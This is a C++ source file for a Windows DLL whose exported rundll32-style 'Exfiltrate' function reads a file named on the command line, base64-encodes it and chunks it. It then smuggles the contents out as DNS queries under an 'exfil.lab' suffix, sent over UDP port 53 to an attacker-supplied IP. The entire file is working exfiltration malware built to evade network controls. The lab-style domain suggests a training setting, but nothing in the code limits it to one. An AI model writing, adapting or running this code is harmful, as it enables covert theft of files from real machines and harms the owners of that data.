#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <fstream>
#include <iostream>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_PORT 53
#define CHUNK_SIZE 45
#define SUFFIX "exfil.lab"

std::string base64_encode(const std::vector<unsigned char>& data) {
    static const char table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    std::string encoded;
    int val = 0, valb = -6;
    for (unsigned char c : data) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            encoded.push_back(table[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) encoded.push_back(table[((val << 8) >> (valb + 8)) & 0x3F]);
    return encoded;
}

std::vector<std::string> chunk_data(const std::string& data, size_t size) {
    std::vector<std::string> chunks;
    for (size_t i = 0; i < data.size(); i += size)
        chunks.push_back(data.substr(i, size));
    return chunks;
}

std::vector<unsigned char> build_dns_query(const std::string& domain) {
    std::vector<unsigned char> query;
    query.push_back(0x12); query.push_back(0x34); 
    query.push_back(0x01); query.push_back(0x00);
    query.push_back(0x00); query.push_back(0x01); 
    query.insert(query.end(), 6, 0x00);           

    std::istringstream ss(domain);
    std::string label;
    while (std::getline(ss, label, '.')) {
        query.push_back(static_cast<unsigned char>(label.size()));
        query.insert(query.end(), label.begin(), label.end());
    }
    query.push_back(0x00); 
    query.push_back(0x00); query.push_back(0x01); 
    query.push_back(0x00); query.push_back(0x01); 
    return query;
}

extern "C" __declspec(dllexport)
void CALLBACK Exfiltrate(HWND, HINSTANCE, LPSTR cmdLine, int) {
    std::istringstream iss(cmdLine);
    std::string ip, filepath;
    iss >> ip >> std::ws;
    std::getline(iss, filepath);

    if (ip.empty() || filepath.empty()) return;

    std::ifstream file(filepath, std::ios::binary);
    if (!file) return;

    std::vector<unsigned char> raw_data((std::istreambuf_iterator<char>(file)), {});
    std::string encoded = base64_encode(raw_data);
    std::vector<std::string> chunks = chunk_data(encoded, CHUNK_SIZE);

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;

    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    sockaddr_in server{};
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, ip.c_str(), &server.sin_addr);

    for (size_t i = 0; i < chunks.size(); ++i) {
        std::ostringstream domain;
        domain << chunks[i] << "." << i << "." << SUFFIX;
        std::vector<unsigned char> query = build_dns_query(domain.str());
        sendto(sock, reinterpret_cast<const char*>(query.data()), query.size(), 0,
               reinterpret_cast<sockaddr*>(&server), sizeof(server));
        Sleep(10);
    }

    std::vector<unsigned char> fin_query = build_dns_query("fin." SUFFIX);
    sendto(sock, reinterpret_cast<const char*>(fin_query.data()), fin_query.size(), 0,
           reinterpret_cast<sockaddr*>(&server), sizeof(server));

    closesocket(sock);
    WSACleanup();
}
